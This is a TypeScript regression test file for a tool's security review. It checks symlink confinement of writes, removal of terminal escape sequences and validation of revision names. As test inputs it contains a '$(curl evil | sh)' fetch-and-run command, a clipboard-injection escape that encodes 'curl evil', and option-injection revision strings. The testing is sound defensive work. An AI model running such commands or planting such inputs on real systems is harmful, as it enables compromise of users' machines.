/**
 * Regression tests of the 1.0.0 security review (documentation/architecture/security-review.md).
 */
import { mkdir, mkdtemp, readdir, readFile, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { assertNoSymlinkBelow, confineWrites, writeFileAtomic, writeJson } from "./fs.js";
import { createLogger, fileSink } from "./logger.js";
import { assertSafeRevision } from "./paths.js";
import { terminalSafe } from "./text.js";

const dirs: string[] = [];
afterEach(async () => {
  await Promise.all(dirs.splice(0).map((d) => rm(d, { recursive: true, force: true })));
});

/** A project with a store, and an "outside" directory standing in for ~/.ssh. */
async function project() {
  const base = await mkdtemp(join(tmpdir(), "st-sec-"));
  dirs.push(base);
  const root = join(base, "repo");
  const outside = join(base, "home");
  await mkdir(join(root, ".smarttest"), { recursive: true });
  await mkdir(outside, { recursive: true });
  confineWrites(root, join(root, ".smarttest"));
  return { root, outside, store: join(root, ".smarttest") };
}

const dirType = process.platform === "win32" ? "junction" : "dir";

describe("store writes never follow a link out of the project (SR-01)", () => {
  it("refuses a committed directory link inside the store", async () => {
    const { store, outside } = await project();
    await symlink(outside, join(store, "state"), dirType);
    await expect(writeJson(join(store, "state", "history.json"), { x: 1 })).rejects.toMatchObject({
      code: "ST_UNSAFE_PATH",
    });
    expect(await readdir(outside)).toEqual([]);
  });

  it("refuses a store directory that is itself a link", async () => {
    const base = await mkdtemp(join(tmpdir(), "st-sec-"));
    dirs.push(base);
    const root = join(base, "repo");
    const outside = join(base, "home");
    await mkdir(root, { recursive: true });
    await mkdir(outside);
    await symlink(outside, join(root, ".smarttest"), dirType);
    confineWrites(root, join(root, ".smarttest"));
    await expect(writeFileAtomic(join(root, ".smarttest", "runs", "x.json"), "{}")).rejects.toThrow(
      /symbolic link/,
    );
    expect(await readdir(outside)).toEqual([]);
  });

  it("refuses a link at the file itself and writes through real directories", async () => {
    const { store, outside } = await project();
    await mkdir(join(store, "runs"));
    if (process.platform !== "win32") {
      await writeFile(join(outside, "authorized_keys"), "original\n");
      await symlink(join(outside, "authorized_keys"), join(store, "runs", "latest.json"));
      await expect(writeJson(join(store, "runs", "latest.json"), {})).rejects.toMatchObject({
        code: "ST_UNSAFE_PATH",
      });
      expect(await readFile(join(outside, "authorized_keys"), "utf8")).toBe("original\n");
    }
    await writeJson(join(store, "cache", "deep", "ok.json"), { ok: true });
    expect(await readFile(join(store, "cache", "deep", "ok.json"), "utf8")).toContain('"ok"');
  });

  it("does not append log lines through a planted link (e.g. to ~/.bashrc)", async () => {
    const { store, outside } = await project();
    if (process.platform === "win32") return; // file links need privileges on Windows
    await mkdir(join(store, "logs"));
    await writeFile(join(outside, ".bashrc"), "# rc\n");
    await symlink(join(outside, ".bashrc"), join(store, "logs", "smarttest.log"));
    const logger = createLogger({
      level: "info",
      scope: "t",
      sinks: [fileSink(join(store, "logs", "smarttest.log"))],
    });
    logger.info("$(curl evil | sh)");
    expect(await readFile(join(outside, ".bashrc"), "utf8")).toBe("# rc\n");
  });

  it("checks a path against a root without a registry", async () => {
    const { root, outside } = await project();
    await symlink(outside, join(root, "tests"), dirType);
    expect(() => assertNoSymlinkBelow(root, join(root, "tests", "a.test.ts"))).toThrow(
      /symbolic link/,
    );
    expect(() => assertNoSymlinkBelow(root, join(root, "..", "x"))).toThrow(/outside/);
    expect(() => assertNoSymlinkBelow(root, join(root, "src", "new", "a.ts"))).not.toThrow();
  });
});

describe("terminal output (SR-07)", () => {
  it("removes escape sequences from repository text but keeps SmartTest's colours", () => {
    const evil =
      "it works\u001b[1A\u001b[2K\u001b]52;c;Y3VybCBldmls\u0007\u001b]0;title\u0007\u001b[8mhidden\rX\u009b31m";
    expect(terminalSafe(evil)).toBe("it workshiddenX31m");
    const ours = "\u001b[32m✓\u001b[39m \u001b[30;42;1m PASS \u001b[0m\tdone\n";
    expect(terminalSafe(ours)).toBe(ours);
  });
});

describe("revision names (SR-05)", () => {
  it("refuses option-like and control-character revisions", () => {
    for (const ref of ["--output=/tmp/x", "-r", "", "main\nx", "a\u0000b"])
      expect(() => assertSafeRevision(ref)).toThrow(/not a valid revision/);
    for (const ref of ["main", "origin/main", "HEAD~2", "v1.0.0", "a".repeat(40)])
      expect(assertSafeRevision(ref)).toBe(ref);
  });
});
